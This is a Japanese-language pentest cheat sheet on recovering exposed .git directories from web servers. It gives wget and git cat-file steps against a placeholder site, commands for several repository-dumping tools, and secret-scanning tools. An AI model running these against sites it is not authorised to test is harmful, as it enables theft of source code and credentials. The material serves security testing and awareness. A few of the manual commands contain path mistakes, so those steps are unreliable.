# Git

## 概要

* [方法論](#方法論)
    * [.git/logs/HEADからファイル内容を回復する](#gitlogsheadからのファイル内容を回復する)
    * [.git/indexからファイル内容を回復する](#gitindexからのファイル内容を回復する)
* [ツール](#ツール)
    * [自動回復](#自動回復)
        * [git-dumper.py](#git-dumperpy)
        * [diggit.py](#diggitpy)
        * [GoGitDumper](#gogitdumper)
        * [rip-git](#rip-git)
        * [GitHack](#githack)
        * [GitTools](#gittools)
    * [シークレット収穫](#シークレット収穫)
        * [noseyparker](#noseyparker)
        * [trufflehog](#trufflehog)
        * [Yar](#yar)
        * [Gitrob](#gitrob)
        * [Gitleaks](#gitleaks)
* [参考文献](#参考文献)

## 方法論

以下の例では、.gitのコピーまたは現在のコミットのコピーを作成します。

次のファイルがあるかどうかを確認し、存在する場合は.gitフォルダを抽出できます。

* `.git/config`
* `.git/HEAD`
* `.git/logs/HEAD`

### .git/logs/HEADからファイル内容を回復する

* `.git/`ディレクトリを発見するために「403 Forbidden」またはディレクトリ一覧表示をチェックします
* Gitはすべての情報を`.git/logs/HEAD`に保存しています（`head`も小文字で試してみてください）

  ```powershell
  0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
  15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
  26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
  6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.
  ```

* コミットをハッシュを使用してアクセスする

  ```powershell
  # 空の.gitリポジトリを作成
  git init test
  cd test/.git

  # ファイルをダウンロード
  wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c

  # 最初のバイトはサブディレクトリ、残りのバイトはファイル名
  mkdir .git/object/26
  mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/

  # ファイルを表示
  git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
      tree 323240a3983045cdc0dec2e88c1358e7998f2e39
      parent 15ca375e54f056a576905b41a417b413c57df6eb
      author Michael <michael@easyctf.com> 1489390329 +0000
      committer Michael <michael@easyctf.com> 1489390329 +0000
      Initial.
  ```

* ツリー323240a3983045cdc0dec2e88c1358e7998f2e39にアクセスする

    ```powershell
    wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
    mkdir .git/object/32
    mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/

    git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
        040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
        100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
        040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
        100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
        040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js
    ```

* データを読み込む（flag.txt）

  ```powershell
  wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
  mkdir .git/object/cb
  mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/32/
  git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f
  ```

### .git/indexからファイル内容を回復する

gitインデックスファイルパーサーを使用します。<https://pypi.python.org/pypi/gin> (Python3)

```powershell
pip3 install gin
gin ~/git-repo/.git/index
```

インデックスにリストされているすべてのファイルの名前とSHA1ハッシュを回復し、上記と同じプロセスでファイルを回復します。

```powershell
$ gin .git/index | egrep -e "name|sha1"
name = AWS Amazon Bucket S3/README.md
sha1 = 862a3e58d138d6809405aa062249487bee074b98

name = CRLF injection/README.md
sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141
```

## ツール

### 自動回復

#### git-dumper.py

* [arthaud/git-dumper](https://github.com/arthaud/git-dumper)

```powershell
pip install -r requirements.txt
./git-dumper.py http://web.site/.git ~/website
```

#### diggit.py

* [bl4de/security-tools/diggit](https://github.com/bl4de/security-tools/)

```powershell
./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1
```

`-u`は.gitフォルダが存在するリモートパスです  
`t`はダミーGitリポジトリのローカルフォルダであり、blobコンテンツ（ファイル）は実際の名前で保存されます(`cd /path/to/temp/folder && git init`)  
`-o`は特定のGitオブジェクトのハッシュです

#### GoGitDumper

* [c-sto/gogitdumper](https://github.com/c-sto/gogitdumper)

```powershell
go get github.com/c-sto/gogitdumper
gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/
git log
git checkout
```

#### rip-git

* [kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)

```powershell
perl rip-git.pl -v -u "http://web.site/.git/"

git cat-file -p 07603070376d63d911f608120eb4b5489b507692
tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
parent 15ca375e54f056a576905b41a417b413c57df6eb
author Michael <michael@easyctf.com> 1489389105 +0000
committer Michael <michael@easyctf.com> 1489389105 +0000

git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
```

#### GitHack

* [lijiejie/GitHack](https://github.com/lijiejie/GitHack)

```powershell
GitHack.py http://web.site/.git/
```

#### GitTools

* [internetwache/GitTools](https://github.com/internetwache/GitTools)

```powershell
./gitdumper.sh http://target.tld/.git/ /tmp/destdir
git checkout -- .
```

### シークレット収穫

#### noseyparker

> [praetorian-inc/noseyparker](https://github.com/praetorian-inc/noseyparker) - Nosey Parkerは、テキストデータやGit履歴の中からシークレットや機密情報を検出するコマンドラインツールです。

```ps1
git clone https://github.com/trufflesecurity/test_keys
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest scan --datastore datastore.np ./test_keys/
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest report --color always
noseyparker scan --datastore np.noseyparker --git-url https://github.com/praetorian-inc/noseyparker
noseyparker scan --datastore np.noseyparker --github-user octocat
```

#### trufflehog

> Gitリポジトリ内での高エントロピー文字列やシークレットを掘り起こします。

```powershell
pip install truffleHog
truffleHog --regex --entropy=False https://github.com/trufflesecurity/trufflehog.git
```

#### Yar

> ユーザーや組織のGitリポジトリ内でのシークレットを正規表現、エントロピー、またはその両方で検索します。truffleHogに触発されました。

```powershell
go get github.com/nielsing/yar # https://github.com/nielsing/yar
yar -o orgname --both
```

#### Gitrob

> Gitrobは、GitHub上のパブリックリポジトリにプッシュされた可能性のある機密ファイルを探し出すためのツールです。Gitrobは、ユーザーまたは組織に属するリポジトリを指定可能な深さまでクローンし、コミット履歴を反復処理して、潜在的に機密ファイルに一致するファイルをフラグメントします。

```powershell
go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
gitrob [options] target [target2] ... [targetN]
```

#### Gitleaks

> Gitleaksは、Gitソースコードリポジトリ内の暗号化されていないシークレットや他の不適切なデータタイプを検出する手段を提供します。

* 公開リポジトリに対してgitleaksを実行する

    ```powershell
    docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git
    ```

* すでに/tmp/にクローンされているローカルリポジトリに対してgitleaksを実行する

    ```powershell
    docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks
    ```

* 特定のGitHub Pull Requestに対してgitleaksを実行する

    ```powershell
    docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000
    ```

## 参考文献

* [Gitrob: Now in Go - Michael Henriksen - January 24, 2024](https://michenriksen.com/blog/gitrob-now-in-go/)